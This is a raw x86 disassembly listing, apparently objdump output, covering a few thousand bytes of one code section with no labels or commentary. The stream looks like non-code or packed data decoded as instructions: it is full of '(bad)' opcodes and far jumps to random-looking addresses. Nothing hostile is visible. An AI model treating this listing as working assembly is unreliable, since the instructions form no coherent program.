  41e4fd:	adc    DWORD PTR [edx],eax
  41e4ff:	test   BYTE PTR [edi],ch
  41e501:	pusha  
  41e502:	adc    eax,esp
  41e504:	sbb    al,0xae
  41e506:	das    
  41e507:	pop    eax
  41e508:	ins    BYTE PTR es:[edi],dx
  41e509:	xor    DWORD PTR [ecx+0x19],ecx
  41e50c:	fimul  WORD PTR [ecx]
  41e50e:	arpl   WORD PTR [eax],cx
  41e510:	retf   0x8d7c
  41e513:	mov    gs,WORD PTR [ebx+0x3b]
  41e516:	push   edi
  41e517:	fcomip st,st(7)
  41e519:	push   cs
  41e51a:	cmp    ebx,edi
  41e51c:	dec    edi
  41e51d:	mov    edx,0xd566c9e3
  41e522:	aas    
  41e523:	cmp    DWORD PTR [edi-0x142df101],ecx
  41e529:	popf   
  41e52a:	sbb    eax,DWORD PTR [edi-0x72]
  41e52d:	gs jno 0x41e581
  41e530:	adc    eax,0xf107ccb8
  41e535:	cmp    ch,BYTE PTR [ebx+ecx*1]
  41e538:	sub    eax,0x14aa336a
  41e53d:	jge    0x41e5b3
  41e53f:	int    0xc2
  41e541:	adc    BYTE PTR [edx],cl
  41e543:	imul   eax,DWORD PTR [ebp+0x56],0xb8ce013c
  41e54a:	push   ebx
  41e54b:	xchg   esi,eax
  41e54c:	mov    es,WORD PTR [ebx+0x554016f0]
  41e552:	mov    dh,0xeb
  41e554:	push   es
  41e555:	or     edi,DWORD PTR [eax-0x34]
  41e558:	lock jmp 0x42e26b14
  41e55e:	mov    ah,0xcd
  41e560:	dec    esp
  41e561:	push   edi
  41e562:	inc    esp
  41e563:	stos   DWORD PTR es:[edi],eax
  41e564:	jl     0x41e538
  41e566:	adc    DWORD PTR ds:0xd16c7cdb,esi
  41e56c:	adc    ch,al
  41e56e:	call   0xe8a7:0x9dbf1a52
  41e575:	out    dx,eax
  41e576:	mov    eax,0xfce31891
  41e57b:	inc    eax
  41e57c:	call   FWORD PTR [esi]
  41e57e:	xchg   BYTE PTR ds:0xba65fbb2,bl
  41e584:	icebp  
  41e585:	sub    al,0xaa
  41e587:	add    bl,dl
  41e589:	mov    cl,0xfc
  41e58b:	or     DWORD PTR [edx+0x1],ebp
  41e58e:	xor    bh,BYTE PTR [edi+ecx*8-0xf1e65f1]
  41e595:	bound  eax,QWORD PTR ds:0x74c233f2
  41e59b:	aad    0xeb
  41e59d:	out    dx,al
  41e59e:	jle    0x41e528
  41e5a0:	enter  0x2ee7,0x7f
  41e5a4:	clc    
  41e5a5:	mov    ch,0x81
  41e5a7:	and    DWORD PTR ds:0x1dc49ab4,0xffffffb8
  41e5ae:	cdq    
  41e5af:	add    eax,0x3a3c1601
  41e5b4:	pop    ss
  41e5b5:	jl     0x41e582
  41e5b7:	ds cdq 
  41e5b9:	imul   eax,DWORD PTR [eax-0x5708fa7b],0x9340b343
  41e5c3:	loope  0x41e5a1
  41e5c5:	daa    
  41e5c6:	xchg   BYTE PTR [edi+0x78be3d59],dh
  41e5cc:	mov    bl,BYTE PTR [ecx+0x49b3acd6]
  41e5d2:	xchg   esp,eax
  41e5d3:	int    0xcd
  41e5d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e5d6:	loopne 0x41e589
  41e5d8:	(bad)  
  41e5d9:	xchg   esp,eax
  41e5da:	sub    ebx,esi
  41e5dc:	jnp    0x41e5c2
  41e5de:	mov    eax,0x165e7497
  41e5e3:	inc    esi
  41e5e4:	mov    ebx,DWORD PTR [esi+0x64c4a153]
  41e5ea:	mov    ah,0xaf
  41e5ec:	and    eax,0x9396310e
  41e5f1:	and    dl,al
  41e5f3:	test   al,0xa2
  41e5f5:	cmc    
  41e5f6:	scas   eax,DWORD PTR es:[edi]
  41e5f7:	xor    DWORD PTR [edi],esp
  41e5f9:	adc    BYTE PTR [edi-0xc],bl
  41e5fc:	mov    bl,0x9a
  41e5fe:	outs   dx,BYTE PTR ds:[esi]
  41e5ff:	loopne 0x41e59d
  41e601:	ret    
  41e602:	xor    eax,0x2e07e5a7
  41e607:	loop   0x41e5a5
  41e609:	add    DWORD PTR [esi],0x2d
  41e60c:	scas   eax,DWORD PTR es:[edi]
  41e60d:	out    0x8f,eax
  41e60f:	pop    es
  41e610:	mov    ds:0xec338bcd,al
  41e615:	adc    al,0x8d
  41e617:	mov    esi,esi
  41e619:	test   BYTE PTR [eax],0xdb
  41e61c:	lahf   
  41e61d:	sti    
  41e61e:	enter  0x8e58,0x98
  41e622:	xor    eax,0x4dde6a88
  41e627:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e628:	sti    
  41e629:	ins    DWORD PTR es:[edi],dx
  41e62a:	or     eax,0xa1adc7cf
  41e62f:	lock rcl BYTE PTR [edi+0x5c766c39],1
  41e636:	pop    esi
  41e637:	scas   eax,DWORD PTR es:[edi]
  41e638:	dec    edx
  41e639:	dec    edi
  41e63a:	push   0x54e5860a
  41e63f:	iret   
  41e640:	test   BYTE PTR [edx],cl
  41e642:	nop
  41e643:	xor    bh,BYTE PTR [ebx+0x52]
  41e646:	arpl   WORD PTR [edi-0x65d56681],cx
  41e64c:	cmp    cl,BYTE PTR [ecx+0x3a]
  41e64f:	or     BYTE PTR [ebp-0x80],al
  41e652:	sbb    BYTE PTR [eax+ebx*8+0x13],0x67
  41e657:	push   eax
  41e658:	clc    
  41e659:	mov    dl,0x19
  41e65b:	cli    
  41e65c:	and    esi,DWORD PTR [ebp+0x69]
  41e65f:	addr16 test eax,0x96e067b3
  41e665:	cmp    ecx,DWORD PTR [esi-0x44]
  41e668:	call   0xd7c030c5
  41e66d:	(bad)  
  41e66e:	dec    esi
  41e66f:	daa    
  41e670:	mov    dl,0x51
  41e672:	sub    bl,0xc3
  41e675:	bound  esp,QWORD PTR [ecx+0x2f174a5]
  41e67b:	daa    
  41e67c:	nop
  41e67d:	shl    DWORD PTR [esi],cl
  41e67f:	mov    esi,0x7a31d93f
  41e684:	fs ds ret 0xcaca
  41e689:	jne    0x41e6c5
  41e68b:	lahf   
  41e68c:	nop
  41e68d:	mov    DWORD PTR [ecx-0x15fa462c],0xcf3e9707
  41e697:	sbb    eax,0x8868d390
  41e69c:	lods   al,BYTE PTR ds:[esi]
  41e69d:	jle    0x41e65f
  41e69f:	sub    BYTE PTR [edx+0x419184a3],0xce
  41e6a6:	mov    bh,0x78
  41e6a8:	inc    ecx
  41e6a9:	or     ecx,eax
  41e6ab:	pusha  
  41e6ac:	mov    DWORD PTR [ecx+0x5a],0x34871df1
  41e6b3:	dec    esp
  41e6b4:	sbb    DWORD PTR [edi-0x67],esi
  41e6b7:	or     BYTE PTR [ebx+esi*4],0xd6
  41e6bb:	sub    cl,BYTE PTR [ebx+0x1424157b]
  41e6c1:	retf   
  41e6c2:	mov    ch,0xea
  41e6c4:	pop    eax
  41e6c5:	sbb    ebx,DWORD PTR [eax+0x19925ca9]
  41e6cb:	cmp    edx,esp
  41e6cd:	pop    esi
  41e6ce:	jp     0x41e654
  41e6d0:	adc    esi,DWORD PTR [ecx+0xf]
  41e6d3:	push   ecx
  41e6d4:	dec    ecx
  41e6d5:	xchg   edi,eax
  41e6d6:	adc    ebx,0x7d70c72b
  41e6dc:	inc    edi
  41e6dd:	shl    DWORD PTR [ecx+0x768fde31],cl
  41e6e3:	mov    bl,0x90
  41e6e5:	cdq    
  41e6e6:	sub    cl,BYTE PTR [edx+0x1e43d285]
  41e6ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e6ed:	jo     0x41e6a7
  41e6ef:	mov    eax,0xfec4c6d2
  41e6f4:	test   DWORD PTR [edi-0x62],ebx
  41e6f7:	mov    dl,0x56
  41e6f9:	fwait
  41e6fa:	hlt    
  41e6fb:	dec    edx
  41e6fc:	inc    esi
  41e6fd:	xor    eax,0xde1ef828
  41e702:	jno    0x41e759
  41e704:	push   0xd3315e21
  41e709:	jns    0x41e695
  41e70b:	pop    esp
  41e70c:	add    BYTE PTR [ecx],bh
  41e70e:	test   al,0xb0
  41e710:	call   0xd0da:0x80cc5e03
  41e717:	inc    edi
  41e718:	leave  
  41e719:	outs   dx,BYTE PTR ds:[esi]
  41e71a:	pusha  
  41e71b:	pop    edi
  41e71c:	or     BYTE PTR [eax],ch
  41e71e:	aas    
  41e71f:	nop
  41e720:	cmp    al,0x0
  41e722:	xor    bl,BYTE PTR [eax-0x52f7fd60]
  41e728:	lods   eax,DWORD PTR ds:[esi]
  41e729:	jae    0x41e6c2
  41e72b:	mov    esi,0x4588b20a
  41e730:	jmp    0xf12e327
  41e735:	cmp    eax,esi
  41e737:	mov    ebx,0x1fe8cf23
  41e73c:	xchg   DWORD PTR [esi-0x3d2d4d3a],eax
  41e742:	sub    eax,0xfb3f6c97
  41e747:	aas    
  41e748:	xor    bh,BYTE PTR ds:0xafa67c20
  41e74e:	xchg   ecx,eax
  41e74f:	in     al,0xc1
  41e751:	xor    eax,DWORD PTR [edi]
  41e753:	adc    eax,0xd94fa17f
  41e758:	(bad)  
  41e759:	lock retf 0xd36a
  41e75d:	sbb    DWORD PTR [ecx],0xa1cf734f
  41e763:	sub    BYTE PTR [edi],bh
  41e765:	stos   BYTE PTR es:[edi],al
  41e766:	sub    eax,0xb3887309
  41e76b:	das    
  41e76c:	dec    esp
  41e76d:	inc    ebp
  41e76e:	or     ah,BYTE PTR [esi-0x5e2605f8]
  41e774:	push   ss
  41e775:	fs fwait
  41e777:	pop    esp
  41e778:	xor    al,dl
  41e77a:	imul   edi,DWORD PTR [esi],0x6e
  41e77d:	jg     0x41e710
  41e77f:	hlt    
  41e780:	mov    edi,0x7b020252
  41e785:	or     eax,0xdc018102
  41e78a:	and    esp,DWORD PTR [eax+0x4f]
  41e78d:	push   ebp
  41e78e:	and    BYTE PTR [eax-0x7d],0x4f
  41e792:	jg     0x41e716
  41e794:	cmp    edx,DWORD PTR [edi-0x57039f1c]
  41e79a:	jl     0x41e750
  41e79c:	ret    0xbf84
  41e79f:	and    DWORD PTR [esi],0x35bf7055
  41e7a5:	mov    BYTE PTR [edi],ch
  41e7a7:	push   esp
  41e7a8:	and    DWORD PTR [ebx-0x43],eax
  41e7ab:	ficomp WORD PTR [ecx-0x26ba33c9]
  41e7b1:	xor    bl,BYTE PTR [edi-0xd]
  41e7b4:	mov    ds:0x78f20cfb,al
  41e7b9:	push   eax
  41e7ba:	push   0x5c6bd46b
  41e7bf:	cld    
  41e7c0:	and    eax,0x4376dc11
  41e7c5:	mul    DWORD PTR [edx]
  41e7c7:	ins    DWORD PTR es:[edi],dx
  41e7c8:	shl    BYTE PTR [edx+edx*2-0x24623a49],0xeb
  41e7d0:	(bad)  
  41e7d1:	nop
  41e7d2:	ins    BYTE PTR es:[edi],dx
  41e7d3:	inc    edx
  41e7d4:	mov    ds:0x65dd9a34,eax
  41e7d9:	call   0x2f82:0x879e3dd6
  41e7e0:	cdq    
  41e7e1:	lods   al,BYTE PTR ds:[esi]
  41e7e2:	or     esi,eax
  41e7e4:	aad    0x83
  41e7e6:	sahf   
  41e7e7:	(bad)  
  41e7e9:	ins    DWORD PTR es:[edi],dx
  41e7ea:	cli    
  41e7eb:	sub    DWORD PTR [edi],0x18be7819
  41e7f1:	push   ss
  41e7f2:	ret    
  41e7f3:	jae    0x41e863
  41e7f5:	(bad)  
  41e7f6:	and    eax,0x4531f0d0
  41e7fb:	xor    al,0x1e
  41e7fd:	mov    BYTE PTR [ecx-0x75d1deb8],dh
  41e803:	js     0x41e7cc
  41e805:	stos   DWORD PTR es:[edi],eax
  41e806:	mov    BYTE PTR [edi+0x65],dl
  41e809:	xchg   edi,eax
  41e80a:	dec    edx
  41e80b:	inc    eax
  41e80c:	mov    al,0x59
  41e80e:	inc    ebx
  41e80f:	jmp    0x8b78:0x8b6bc561
  41e816:	sbb    DWORD PTR [edx+0x9],0xae237122
  41e81d:	test   al,0x5b
  41e81f:	daa    
  41e820:	mov    edi,0x467d293f
  41e825:	cmp    bh,BYTE PTR [ecx-0x6a]
  41e828:	pop    ebp
  41e829:	ins    BYTE PTR es:[edi],dx
  41e82a:	xor    al,0xc8
  41e82c:	outs   dx,DWORD PTR ds:[esi]
  41e82d:	dec    eax
  41e82e:	xchg   edx,eax
  41e82f:	fs imul edi
  41e832:	stos   BYTE PTR es:[edi],al
  41e833:	sbb    eax,0x1721819e
  41e838:	mov    bl,BYTE PTR [edi+ebp*2]
  41e83b:	ins    WORD PTR es:[edi],dx
  41e83d:	(bad)  
  41e83f:	lods   al,BYTE PTR ds:[esi]
  41e840:	sahf   
  41e841:	xchg   DWORD PTR [ebp-0x7e77c971],ebp
  41e847:	sbb    BYTE PTR [ebx],al
  41e849:	push   ebp
  41e84a:	inc    ebp
  41e84b:	ja     0x41e8c6
  41e84d:	xor    DWORD PTR [esi-0x7e3ae387],esi
  41e853:	xchg   edx,eax
  41e854:	(bad)  
  41e855:	jecxz  0x41e896
  41e857:	lds    eax,FWORD PTR [ebx+0x54]
  41e85a:	jns    0x41e8a8
  41e85c:	iret   
  41e85d:	sbb    bl,BYTE PTR [edi-0x71]
  41e860:	jmp    0x41e8c0
  41e862:	mov    bh,0x72
  41e864:	ror    ch,0x6b
  41e867:	xor    al,0xe
  41e869:	add    al,0x1a
  41e86b:	adc    ecx,DWORD PTR [edx-0xa]
  41e86e:	jl     0x41e894
  41e870:	or     eax,0x81b5c276
  41e875:	jo     0x41e883
  41e877:	xor    DWORD PTR [ebx+0x30c873ad],0x1cd2fefd
  41e881:	lahf   
  41e882:	ret    
  41e883:	rcl    ebp,1
  41e885:	sbb    DWORD PTR [ecx-0x44607b0],esi
  41e88b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e88c:	fstp   DWORD PTR [ebx+0x7c9a435b]
  41e892:	mov    bh,0xa5
  41e894:	pop    ebx
  41e895:	mov    ebx,0xa5229895
  41e89a:	rcr    DWORD PTR [edi],1
  41e89c:	sub    BYTE PTR [esi],ah
  41e89e:	hlt    
  41e89f:	pop    eax
  41e8a0:	xchg   esi,eax
  41e8a1:	inc    edx
  41e8a2:	cmc    
  41e8a3:	stos   DWORD PTR es:[edi],eax
  41e8a4:	xchg   ecx,eax
  41e8a5:	jno    0x41e905
  41e8a7:	mov    esp,0xb89783f4
  41e8ac:	push   cs
  41e8ad:	inc    edx
  41e8ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e8af:	loope  0x41e911
  41e8b1:	loop   0x41e87c
  41e8b3:	jle    0x41e844
  41e8b5:	sti    
  41e8b6:	mov    ds:0x5efd3ee4,eax
  41e8bb:	cmp    DWORD PTR [edx+0x7c],edi
  41e8be:	imul   edx,DWORD PTR [ebp+0x487bc58a],0xb07c7b0e
  41e8c8:	or     edi,DWORD PTR [esi]
  41e8ca:	fnstsw WORD PTR [edx]
  41e8cc:	js     0x41e884
  41e8ce:	dec    esp
  41e8cf:	jo     0x41e85f
  41e8d1:	into   
  41e8d2:	in     al,dx
  41e8d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e8d4:	or     al,0xc8
  41e8d6:	cli    
  41e8d7:	(bad)  
  41e8d8:	adc    BYTE PTR [edi+0x5],cl
  41e8db:	(bad)  
  41e8dc:	push   edx
  41e8dd:	(bad)  
  41e8de:	shl    al,1
  41e8e0:	sbb    al,0xd8
  41e8e2:	mov    ecx,0xb1647ebd
  41e8e7:	lds    eax,FWORD PTR [ebx+edx*4-0x43]
  41e8eb:	nop
  41e8ec:	mov    ah,0xd9
  41e8ee:	lea    ebx,[edx-0x69fa20f4]
  41e8f4:	add    eax,0x98f89604
  41e8f9:	and    BYTE PTR [edx+0x5c9efbed],cl
  41e8ff:	out    dx,eax
  41e900:	xchg   BYTE PTR [ebp-0x9cfbbf0],al
  41e906:	add    ebx,eax
  41e908:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e909:	dec    esi
  41e90a:	arpl   dx,si
  41e90c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e90d:	pop    ds
  41e90e:	loope  0x41e891
  41e910:	aaa    
  41e911:	mov    ecx,0x85c97f4c
  41e916:	jno    0x41e96a
  41e918:	ins    DWORD PTR es:[edi],dx
  41e919:	call   0x5b8fa135
  41e91e:	adc    eax,0xf8a8c8
  41e923:	nop
  41e924:	test   eax,0xc54da943
  41e929:	shl    DWORD PTR [esi],cl
  41e92b:	sub    DWORD PTR [edx],ebx
  41e92d:	push   es
  41e92e:	push   ecx
  41e92f:	or     ah,dh
  41e931:	out    0xf0,ax
  41e934:	pop    ebx
  41e935:	loope  0x41e969
  41e937:	loopne 0x41e900
  41e939:	pop    edx
  41e93a:	ds pop ebx
  41e93c:	push   esi
  41e93d:	pusha  
  41e93e:	ins    DWORD PTR es:[edi],dx
  41e93f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e940:	inc    ebx
  41e941:	and    dh,BYTE PTR ds:0x72d5f2b6
  41e947:	sbb    esi,DWORD PTR [edi+0xe70f65d]
  41e94d:	jbe    0x41e942
  41e94f:	std    
  41e950:	(bad)  
  41e952:	cdq    
  41e953:	push   ebp
  41e954:	pop    ss
  41e955:	jmp    0xf5a1730c
  41e95a:	cmp    DWORD PTR [esi],esp
  41e95c:	ret    0xec4c
  41e95f:	sbb    dl,BYTE PTR [edx+0x3be21f67]
  41e965:	and    BYTE PTR [ebx+0x65],0x37
  41e969:	push   edx
  41e96a:	xchg   edx,ebx
  41e96c:	mulps  xmm7,XMMWORD PTR [ebx+0x1c]
  41e970:	xchg   edx,eax
  41e971:	leave  
  41e972:	xchg   esp,eax
  41e973:	and    eax,0x42920efe
  41e978:	adc    ecx,DWORD PTR [ebx-0x4c4fd465]
  41e97e:	sbb    ch,dh
  41e980:	add    eax,0x82cda0e3
  41e985:	fisubr WORD PTR [edi-0x7f]
  41e988:	inc    ebp
  41e989:	bound  ecx,QWORD PTR [eax+0x70]
  41e98c:	mul    DWORD PTR [eax-0xce02a42]
  41e992:	push   0xfffffffe
  41e994:	rol    BYTE PTR [ecx-0x7abb3cad],0xba
  41e99b:	sbb    eax,0x606f7c16
  41e9a0:	test   edx,0xf7273631
  41e9a6:	arpl   WORD PTR ds:0xa9aac71,ax
  41e9ac:	xor    dh,BYTE PTR [esp+edi*4+0x638c1cfd]
  41e9b3:	repnz es xchg edx,eax
  41e9b6:	xor    al,0x65
  41e9b8:	cmp    al,0xcb
  41e9ba:	push   ecx
  41e9bb:	sub    BYTE PTR [ebx],ah
  41e9bd:	repz rol BYTE PTR [ecx+ebx*2],0xa1
  41e9c2:	jae    0x41ea2d
  41e9c4:	dec    edi
  41e9c5:	adc    BYTE PTR es:[ecx+0x5aa07c4a],0x86
  41e9cd:	jle    0x41e9d8
  41e9cf:	(bad)  
  41e9d0:	jle    0x41e976
  41e9d2:	iret   
  41e9d3:	fsub   DWORD PTR [ebx+0x6c240707]
  41e9d9:	or     BYTE PTR [ecx],ch
  41e9db:	bswap  ebx
  41e9dd:	sub    bh,BYTE PTR [ebp-0x15b15522]
  41e9e3:	inc    ecx
  41e9e4:	jge    0x41e98c
  41e9e6:	push   es
  41e9e7:	lea    esi,[edx-0x3d]
  41e9ea:	inc    edi
  41e9eb:	jl     0x41ea52
  41e9ed:	or     DWORD PTR es:[esi+0x2c],ebx
  41e9f1:	les    ecx,FWORD PTR [edi+0x65]
  41e9f4:	int3   
  41e9f5:	or     edi,DWORD PTR [edx]
  41e9f7:	mov    ss,WORD PTR [ebp-0x754a783d]
  41e9fd:	xchg   esi,eax
  41e9fe:	mov    dl,0x3a
  41ea00:	imul   esi,DWORD PTR [eax-0x77],0xb2895827
  41ea07:	outs   dx,BYTE PTR ds:[esi]
  41ea08:	sbb    DWORD PTR [eax],ebp
  41ea0a:	stos   DWORD PTR es:[edi],eax
  41ea0b:	icebp  
  41ea0c:	ja     0x41e9e6
  41ea0e:	rol    BYTE PTR [ecx-0x6f],0x12
  41ea12:	stos   BYTE PTR es:[edi],al
  41ea13:	jp     0x41ea1b
  41ea15:	mov    ch,0xc2
  41ea17:	xor    dh,dh
  41ea19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ea1a:	out    dx,al
  41ea1b:	xchg   ecx,eax
  41ea1c:	cmp    edi,edi
  41ea1e:	pop    es
  41ea1f:	push   edx
  41ea20:	je     0x41e9a8
  41ea22:	icebp  
  41ea23:	inc    edi
  41ea24:	mov    cl,BYTE PTR [ebx+edx*4]
  41ea27:	outs   dx,DWORD PTR ds:[esi]
  41ea28:	sbb    bh,BYTE PTR [ecx-0x4609d6d5]
  41ea2e:	mov    dh,0x8b
  41ea30:	and    bl,BYTE PTR [edi+0x2f]
  41ea33:	push   ebp
  41ea34:	cmp    eax,DWORD PTR [ecx]
  41ea36:	(bad)  
  41ea37:	mov    ds:0x6616078e,eax
  41ea3c:	sbb    BYTE PTR [edx],dl
  41ea3e:	pop    ss
  41ea3f:	xchg   ebp,eax
  41ea40:	jno    0x41ea46
  41ea42:	mov    dh,0x9c
  41ea45:	(bad)  
  41ea46:	enter  0x3cb0,0x6d
  41ea4a:	sti    
  41ea4b:	mov    BYTE PTR [esi-0x7c2abd8d],ah
  41ea51:	mov    cl,0x89
  41ea53:	aas    
  41ea54:	lea    edi,[ecx-0x2a]
  41ea57:	sub    DWORD PTR [eax+0x24],ebx
  41ea5a:	pop    esp
  41ea5b:	cwde   
  41ea5c:	dec    edi
  41ea5d:	push   0x50
  41ea5f:	sub    eax,0x54dc69de
  41ea64:	and    eax,0x2fac1c42
  41ea69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ea6a:	push   ds
  41ea6b:	mov    DWORD PTR [ecx-0x4e],esi
  41ea6e:	ss aam 0xdd
  41ea71:	fcom   DWORD PTR [esi]
  41ea73:	xor    BYTE PTR [edx],cl
  41ea75:	jecxz  0x41ea6a
  41ea77:	ucomiss xmm1,DWORD PTR [edx+0x3ff860bf]
  41ea7e:	jecxz  0x41eaa6
  41ea80:	repz retf 0x256
  41ea84:	stc    
  41ea85:	and    BYTE PTR [eax+eiz*8+0x41],0xad
  41ea8a:	or     ah,BYTE PTR [ebp+0x1f606c3d]
  41ea90:	and    BYTE PTR [edi+0x53d4dd99],bl
  41ea96:	and    al,0xd4
  41ea98:	mov    al,0xb4
  41ea9a:	mov    ds:0x7a68fa6,al
  41ea9f:	rcl    DWORD PTR [edi-0x6447d5a3],cl
  41eaa5:	enter  0x59ec,0xeb
  41eaa9:	pop    ebp
  41eaaa:	outs   dx,BYTE PTR ds:[esi]
  41eaab:	das    
  41eaac:	sub    esi,DWORD PTR [eax+edx*1-0x35]
  41eab0:	add    al,BYTE PTR [ecx+0x4]
  41eab3:	and    BYTE PTR [eax-0x582c016b],cl
  41eab9:	bound  edi,QWORD PTR [ebx]
  41eabb:	lahf   
  41eabc:	outs   dx,DWORD PTR ds:[esi]
  41eabd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eabe:	cmp    cl,bl
  41eac0:	and    eax,0xe31fc609
  41eac5:	repz pop edi
  41eac7:	out    dx,al
  41eac8:	and    eax,DWORD PTR [esi-0x43]
  41eacb:	pop    ebx
  41eacc:	xlat   BYTE PTR ds:[ebx]
  41eacd:	fs add dh,dl
  41ead0:	out    dx,eax
  41ead1:	and    edi,esi
  41ead3:	add    BYTE PTR [edi],bl
  41ead5:	xchg   ebx,eax
  41ead6:	sub    BYTE PTR [edi+0x7],ch
  41ead9:	dec    eax
  41eada:	(bad)  
  41eadb:	cmp    al,0xe3
  41eadd:	icebp  
  41eade:	or     DWORD PTR [ecx],edi
  41eae0:	stos   DWORD PTR es:[edi],eax
  41eae1:	push   ebx
  41eae2:	cmc    
  41eae3:	test   DWORD PTR [eax-0x680060b4],0xed55f570
  41eaed:	test   eax,0xb4ee0fa1
  41eaf2:	ret    0x883e
  41eaf5:	pusha  
  41eaf6:	push   ds
  41eaf7:	push   cs
  41eaf8:	jno    0x41eb28
  41eafa:	sub    BYTE PTR [ecx+0x1b18d4c1],bl
  41eb00:	pop    eax
  41eb01:	sbb    cl,BYTE PTR [ebp+0x4c]
  41eb04:	mov    ecx,0x53600a41
  41eb0a:	xchg   edi,eax
  41eb0b:	shl    BYTE PTR gs:[edx+0x25],cl
  41eb0f:	sbb    eax,0xb48b67de
  41eb14:	(bad)  
  41eb15:	push   ecx
  41eb16:	xor    al,BYTE PTR [ebx+0x6ce97201]
  41eb1c:	icebp  
  41eb1d:	push   ss
  41eb1e:	cmc    
  41eb1f:	enter  0x7ab0,0xc7
  41eb23:	leave  
  41eb24:	or     DWORD PTR [esi+0x23cb8ed2],esi
  41eb2a:	xchg   ebp,eax
  41eb2b:	adc    DWORD PTR [edi-0x56860006],ebx
  41eb31:	inc    ebp
  41eb32:	div    BYTE PTR [edi+0x6b]
  41eb35:	xor    al,0xd6
  41eb37:	fist   DWORD PTR [edx]
  41eb39:	mov    eax,ds:0xf05268bc
  41eb3e:	jns    0x41eaf1
  41eb40:	cmp    bh,BYTE PTR [eax+0x0]
  41eb43:	(bad)  
  41eb44:	(bad)  [eax+ebp*8]
  41eb47:	sub    dh,ah
  41eb49:	push   edi
  41eb4a:	int3   
  41eb4b:	jb     0x41eb88
  41eb4d:	cwde   
  41eb4e:	adc    bh,BYTE PTR [ebx-0x3e]
  41eb51:	ins    BYTE PTR es:[edi],dx
  41eb52:	mov    ah,0x54
  41eb54:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eb55:	push   esp
  41eb56:	or     edi,edi
  41eb58:	stos   BYTE PTR es:[edi],al
  41eb59:	add    esi,esi
  41eb5b:	clc    
  41eb5c:	xchg   esi,eax
  41eb5d:	dec    ebp
  41eb5e:	stos   BYTE PTR es:[edi],al
  41eb5f:	sbb    bh,BYTE PTR [edi-0x2fd5384]
  41eb65:	push   ds
  41eb66:	xchg   DWORD PTR [ecx-0xe],eax
  41eb69:	mov    ecx,DWORD PTR [esi]
  41eb6b:	pop    edx
  41eb6c:	stos   BYTE PTR es:[edi],al
  41eb6d:	(bad)  
  41eb6e:	sub    al,0x46
  41eb70:	mov    ch,0x9
  41eb72:	mov    bl,0xdb
  41eb74:	loop   0x41ebe0
  41eb76:	or     BYTE PTR [ebx-0x22],bl
  41eb79:	push   esp
  41eb7a:	push   edx
  41eb7b:	sahf   
  41eb7c:	icebp  
  41eb7d:	push   0xffffffef
  41eb7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eb80:	dec    edi
  41eb81:	jns    0x41ebf3
  41eb83:	sbb    BYTE PTR [esi],ah
  41eb85:	mov    eax,ds:0x748bb7a2
  41eb8a:	int    0x5d
  41eb8c:	mov    al,ds:0x29134ac7
  41eb91:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eb92:	scas   al,BYTE PTR es:[edi]
  41eb93:	and    eax,0xc4013fb
  41eb98:	push   esp
  41eb99:	jle    0x41eb87
  41eb9b:	lods   al,BYTE PTR ds:[esi]
  41eb9c:	dec    ebx
  41eb9d:	jmp    0x6d1c6622
  41eba2:	cli    
  41eba3:	(bad)  
  41eba4:	mov    bh,0x11
  41eba6:	mov    al,0x5f
  41eba8:	cmp    DWORD PTR [esi+eiz*4+0x7915e2ea],eax
  41ebaf:	clc    
  41ebb0:	out    dx,eax
  41ebb1:	inc    esp
  41ebb2:	mov    eax,ds:0x7a167096
  41ebb7:	pop    ecx
  41ebb8:	or     edx,DWORD PTR [edx+0x1fbe3b4]
  41ebbe:	out    0x60,eax
  41ebc0:	js     0x41eb54
  41ebc2:	test   edi,esp
  41ebc4:	or     eax,0x2a438233
  41ebc9:	cmp    BYTE PTR [ebp+edx*8-0x7057aca1],cl
  41ebd0:	ins    DWORD PTR es:[edi],dx
  41ebd1:	sub    al,0xae
  41ebd3:	cdq    
  41ebd4:	pop    ds
  41ebd5:	gs jnp 0x41eb75
  41ebd8:	(bad)  
  41ebd9:	xor    DWORD PTR [edi+0x2d],ebp
  41ebdc:	jnp    0x41ec52
  41ebde:	nop
  41ebdf:	add    al,0xaa
  41ebe1:	les    ebx,FWORD PTR [edx-0x45490134]
  41ebe7:	add    eax,edi
  41ebe9:	jge    0x41eb9e
  41ebeb:	test   BYTE PTR [edx-0x5f],bl
  41ebee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ebef:	sbb    eax,0xbc648872
  41ebf4:	lods   eax,DWORD PTR ds:[esi]
  41ebf5:	lods   al,BYTE PTR cs:[esi]
  41ebf7:	loop   0x41ebd2
  41ebf9:	repz mov esi,0x2436eee0
  41ebff:	imul   esp,DWORD PTR [ebp+0x5e5b0da6],0x38
  41ec06:	pop    es
  41ec07:	out    dx,eax
  41ec08:	test   DWORD PTR [edx+0x1e45e68a],edx
  41ec0e:	inc    esp
  41ec0f:	push   0x72
  41ec11:	mov    bh,0x24
  41ec13:	das    
  41ec14:	xor    BYTE PTR [ebp-0x18],bh
  41ec17:	int    0x35
  41ec19:	adc    DWORD PTR [ebx+0x614b9bb1],eax
  41ec1f:	fs sbb eax,0xbddeefa6
  41ec25:	or     ecx,eax
  41ec27:	or     ecx,ecx
  41ec29:	pop    ss
  41ec2a:	(bad)  
  41ec2b:	std    
  41ec2c:	into   
  41ec2d:	mov    al,0x6d
  41ec2f:	dec    ebx
  41ec30:	int    0xe0
  41ec32:	xchg   BYTE PTR [edi],cl
  41ec34:	pop    ebp
  41ec35:	adc    DWORD PTR [ebp+0x65],edi
  41ec38:	add    DWORD PTR [ecx-0x4e],esp
  41ec3b:	mov    dl,BYTE PTR [ecx+0x49]
  41ec3e:	les    ebp,FWORD PTR [ecx]
  41ec40:	push   esi
  41ec41:	cld    
  41ec42:	(bad)  
  41ec43:	mov    eax,0xcd43fe2c
